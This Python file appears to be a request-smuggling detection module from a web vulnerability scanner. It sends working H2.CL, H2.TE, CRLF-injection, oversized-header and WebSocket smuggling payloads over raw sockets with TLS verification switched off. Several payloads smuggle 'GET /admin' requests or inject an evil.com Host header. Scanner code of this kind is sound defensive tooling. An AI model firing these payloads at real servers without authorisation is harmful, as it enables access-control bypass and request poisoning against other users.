#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK - HTTP/2 Request Smuggling Module

Detects HTTP/2 request smuggling vulnerabilities including:
- H2.CL desync (HTTP/2 with Content-Length mismatch)
- H2.TE desync (HTTP/2 with Transfer-Encoding smuggling)
- CRLF injection in HTTP/2 pseudo-headers (:method, :path, :authority)
- Request splitting via oversized headers
- WebSocket upgrade smuggling over HTTP/2
"""

import socket
import ssl
from urllib.parse import urlparse

from config import Payloads
from modules.base import BaseModule


class H2SmugglingModule(BaseModule):
    """HTTP/2 Request Smuggling detection module."""

    name = "HTTP/2 Smuggling"
    vuln_type = "h2_smuggling"

    def __init__(self, engine):
        super().__init__(engine)
        self.timeout = engine.config.get("timeout", 10)

    def test(self, url: str, method: str, param: str, value: str) -> None:
        """Test for HTTP/2 smuggling (URL-level check)."""
        pass  # H2 smuggling is tested at URL level

    def test_url(self, url: str) -> None:
        """Run all HTTP/2 smuggling checks against the target URL."""
        host, port, path, use_ssl = self._parse_url(url)
        if host is None:
            return

        self._test_h2_cl_desync(host, port, path, use_ssl, url)
        self._test_h2_te_desync(host, port, path, use_ssl, url)
        self._test_crlf_pseudo_headers(host, port, path, use_ssl, url)
        self._test_request_splitting(host, port, path, use_ssl, url)
        self._test_websocket_upgrade_smuggling(host, port, path, use_ssl, url)

    def _test_h2_cl_desync(self, host, port, path, use_ssl, url):
        """Detect H2.CL desync: HTTP/2 front-end with Content-Length mismatch.

        Sends a request where the Content-Length header disagrees with
        the actual body length. If the backend processes based on CL
        while the front-end uses HTTP/2 framing, smuggling is possible.
        """
        smuggled_prefix = "GET /admin HTTP/1.1\r\nHost: {}\r\n\r\n".format(host)
        body = "0\r\n\r\n" + smuggled_prefix
        # CL only covers the initial chunk terminator
        cl = len("0\r\n\r\n")

        raw = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {cl}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Connection: Upgrade, HTTP2-Settings\r\n"
            f"Upgrade: h2c\r\n"
            f"HTTP2-Settings: AAMAAABkAAQCAAAAAAIAAAAA\r\n"
            f"\r\n"
            f"{body}"
        )

        try:
            self._raw_send(host, port, raw.encode(), use_ssl)
            # Follow-up request to detect poisoning
            normal = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Connection: close\r\n"
                f"\r\n"
            )
            resp2 = self._raw_send(host, port, normal.encode(), use_ssl)

            if resp2 and self._is_poisoned(resp2):
                self._emit_signal(
                    vuln_type="h2_smuggling",
                    technique="HTTP/2 Request Smuggling (H2.CL Desync)",
                    url=url,
                    method="POST",
                    param="",
                    payload=raw[:300],
                    evidence_text=resp2[:500].decode(errors="replace") if resp2 else "",
                    raw_confidence=0.85,
                    severity="CRITICAL",
                    cvss=9.1,
                )
        except Exception:
            pass

    def _test_h2_te_desync(self, host, port, path, use_ssl, url):
        """Detect H2.TE desync: Transfer-Encoding smuggled through HTTP/2.

        In HTTP/2, Transfer-Encoding is forbidden, but some proxies
        allow it through when downgrading to HTTP/1.1 for the backend.
        """
        smuggled = "SMUGGLED_H2TE"
        body = f"0\r\n\r\n{smuggled}"

        raw = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Connection: Upgrade, HTTP2-Settings\r\n"
            f"Upgrade: h2c\r\n"
            f"\r\n"
            f"{body}"
        )

        try:
            resp = self._raw_send(host, port, raw.encode(), use_ssl)
            if resp and (b"SMUGGLED_H2TE" in resp or self._is_poisoned(resp)):
                self._emit_signal(
                    vuln_type="h2_smuggling",
                    technique="HTTP/2 Request Smuggling (H2.TE Desync)",
                    url=url,
                    method="POST",
                    param="",
                    payload=raw[:300],
                    evidence_text=resp[:500].decode(errors="replace") if resp else "",
                    raw_confidence=0.80,
                    severity="CRITICAL",
                    cvss=9.1,
                )
        except Exception:
            pass

    def _test_crlf_pseudo_headers(self, host, port, path, use_ssl, url):
        """Test CRLF injection in HTTP/2 pseudo-headers.

        Attempts to inject CRLF sequences in :method, :path, and
        :authority pseudo-headers which may be passed unescaped to
        HTTP/1.1 backends during protocol downgrade.
        """
        payloads = getattr(Payloads, "H2_SMUGGLING_PAYLOADS", [])
        if not payloads:
            payloads = [
                "GET / HTTP/1.1\r\nHost: evil.com\r\n\r\n",
                "/admin\r\nHost: evil.com",
                "/ HTTP/1.1\r\nX-Injected: true\r\nHost: evil.com\r\n\r\nGET /admin",
            ]

        for payload in payloads[:5]:
            # Inject into :path pseudo-header equivalent
            injected_path = path + "\r\n" + payload
            raw = (
                f"GET {injected_path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Connection: close\r\n"
                f"\r\n"
            )

            try:
                resp = self._raw_send(host, port, raw.encode(), use_ssl)
                if resp and self._has_crlf_evidence(resp):
                    self._emit_signal(
                        vuln_type="h2_smuggling",
                        technique="HTTP/2 CRLF Injection in Pseudo-Headers",
                        url=url,
                        method="GET",
                        param=":path",
                        payload=payload[:200],
                        evidence_text=resp[:500].decode(errors="replace") if resp else "",
                        raw_confidence=0.80,
                        severity="CRITICAL",
                        cvss=9.1,
                    )
                    break  # One proof is enough
            except Exception:
                continue

    def _test_request_splitting(self, host, port, path, use_ssl, url):
        """Test request splitting via oversized headers in HTTP/2.

        Some HTTP/2 implementations allow headers larger than the
        backend HTTP/1.1 limit, causing request splitting when
        downgraded.
        """
        # Create an oversized header that may cause splitting
        large_value = "A" * 8192 + "\r\nGET /admin HTTP/1.1\r\nHost: {}\r\n\r\n".format(host)
        raw = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"X-Oversized: {large_value}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        )

        try:
            resp = self._raw_send(host, port, raw.encode(), use_ssl)
            if resp and self._is_poisoned(resp):
                self._emit_signal(
                    vuln_type="h2_smuggling",
                    technique="HTTP/2 Request Splitting (Oversized Headers)",
                    url=url,
                    method="GET",
                    param="",
                    payload="X-Oversized: [8192 bytes + CRLF + smuggled request]",
                    evidence_text=resp[:500].decode(errors="replace") if resp else "",
                    raw_confidence=0.75,
                    severity="CRITICAL",
                    cvss=9.1,
                )
        except Exception:
            pass

    def _test_websocket_upgrade_smuggling(self, host, port, path, use_ssl, url):
        """Test WebSocket upgrade smuggling over HTTP/2.

        A malicious WebSocket upgrade request through an HTTP/2 proxy
        may allow subsequent requests to bypass front-end security controls.
        """
        raw = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Upgrade: websocket\r\n"
            f"Connection: Upgrade\r\n"
            f"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
            f"Sec-WebSocket-Version: 13\r\n"
            f"\r\n"
            f"GET /admin HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"\r\n"
        )

        try:
            resp = self._raw_send(host, port, raw.encode(), use_ssl)
            if resp and (b"101" in resp or self._is_poisoned(resp)):
                # Check if the smuggled request was processed
                if self._is_poisoned(resp) or b"admin" in resp.lower():
                    self._emit_signal(
                        vuln_type="h2_smuggling",
                        technique="HTTP/2 WebSocket Upgrade Smuggling",
                        url=url,
                        method="GET",
                        param="",
                        payload="Upgrade: websocket + smuggled request",
                        evidence_text=resp[:500].decode(errors="replace") if resp else "",
                        raw_confidence=0.75,
                        severity="CRITICAL",
                        cvss=9.1,
                    )
        except Exception:
            pass

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _parse_url(url):
        """Extract host, port, path, use_ssl from url."""
        try:
            p = urlparse(url)
            use_ssl = p.scheme == "https"
            host = p.hostname or ""
            port = p.port or (443 if use_ssl else 80)
            path = p.path or "/"
            if p.query:
                path += f"?{p.query}"
            return host, port, path, use_ssl
        except Exception:
            return None, None, None, None

    def _raw_send(self, host, port, data, use_ssl, timeout=None):
        """Send raw bytes and return the response bytes.

        Note: SSL verification is intentionally disabled (check_hostname=False,
        verify_mode=CERT_NONE). This is required for security scanners that
        test arbitrary targets where the scanner does not possess the target's
        CA certificate. Disabling verification is standard practice for
        security scanning tools that need to inspect TLS-protected endpoints
        without a trust relationship.
        """
        timeout = timeout or self.timeout
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        try:
            sock.connect((host, port))
            if use_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)
            sock.sendall(data)
            resp = b""
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
                except socket.timeout:
                    break
            return resp
        except Exception:
            return None
        finally:
            try:
                sock.close()
            except Exception:
                pass

    @staticmethod
    def _is_poisoned(resp):
        """Heuristic: the response shows signs of request smuggling."""
        if isinstance(resp, bytes):
            resp_str = resp.decode(errors="replace")
        else:
            resp_str = resp
        indicators = [
            "HTTP/1.1 405",
            "HTTP/1.1 400",
            "HTTP/1.0 400",
            "Unrecognized method",
            "Invalid request",
            "Bad Request",
            "Method Not Allowed",
            "403 Forbidden",
        ]
        return any(ind in resp_str for ind in indicators)

    @staticmethod
    def _has_crlf_evidence(resp):
        """Check if the response indicates CRLF injection succeeded."""
        if isinstance(resp, bytes):
            resp_str = resp.decode(errors="replace")
        else:
            resp_str = resp
        indicators = [
            "X-Injected: true",
            "evil.com",
        ]
        return any(ind in resp_str for ind in indicators)
